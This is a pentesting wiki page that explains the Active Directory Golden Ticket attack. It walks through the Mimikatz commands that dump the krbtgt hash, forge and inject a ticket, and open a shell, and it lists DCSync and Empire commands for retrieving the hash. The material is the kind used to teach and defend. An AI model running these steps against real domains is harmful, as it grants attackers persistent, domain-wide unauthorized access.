# Golden Ticket

## What is it

A Golden ticket attack is a post compromise Active Directory attack where a compromised account such as a Domain Administrator or an account with DCSync rights which can dump the KRBTGT account hash can create a golden ticket that effectively gives the attacker persistence and the ability to access any resource on the domain. Every time the attacker wants to access a resource they can effectively forge a ticket for that resource in which they can use for access.

## How to perform the attack

### Scenario

The scenario for the attack is we are an attacker who has compromised the Domain Administrator account and is currently running a session under this account. We are on a fully patch Windows Server 2019 machine and we have transferred Mimikatz.exe over to the DC and have started up a shell.

Firstly lets check our privilege on Mimikatz.

```
Privilege::debug
```

![](<../../.gitbook/assets/image (1973).png>)

We should be good to proceed with the return value of '20'. The debug privilege allows local Administrators to attach debuggers to programs. Mimikatz uses this for processes such as LSASS. If the account did not have this access Mimikatz would be more limited in what it is able to do.

We now need to pull relevant information from the KRBTGT account for us to construct the Golden Ticket attack.

```
lsadump::lsa /inject /name:krbtgt
```

From the output of this command we need the following information:\


* Domain SID
* KRBTGT NTLM hash

| Domain SID                                | NTLM Hash                        |
| ----------------------------------------- | -------------------------------- |
| S-1-5-21-2356823372-3609795904-2142328116 | ab20acb811769e025aba7d4fef487b96 |

After obtaining this information we need to put together the command below inside Mimikatz.

```
kerberos::golden /User:Administrator /domain:vuln.local /sid:S-1-5-21-2356823372-3609795904-2142328116 /krbtgt:ab20acb811769e025aba7d4fef487b96 /id:500 /ptt
```

Where:

* /User: Can be any user. The account does not need to exists for this.
* /Domain: is the domain name
* /SID: is the Domain SID
* /Krbtgt: is the NTLM hash of the KRBTGT account.
* id: is the RID of the administrator account which is 500 by default.
* ptt: informs Mimitkaz to pass the ticket over to our next session.

We can confirm if this has worked by checking the last line of the out for:

'Golden ticket for 'Administrator @ vuln.local 'successfully submitted for current session'.

![](<../../.gitbook/assets/image (1974).png>)

We can then create a separate command shell using the Golden Ticket with the following command:

```
misc::cmd
```

With the newly created command shell we can as an example  run the command `dir `on a workstation on the network:

## Methods of Krbtgt hash retrieval

### DCSync

```bash
# Mimikatz
lsadump::dcsync /domain:security.local /all
lsadump::dcsync /domain:security.local /user:krbtgt
lsadump::lsa /patch
```

### Empire

```bash
usemodule credentials/mimikatz/dcsync_hashdump
```
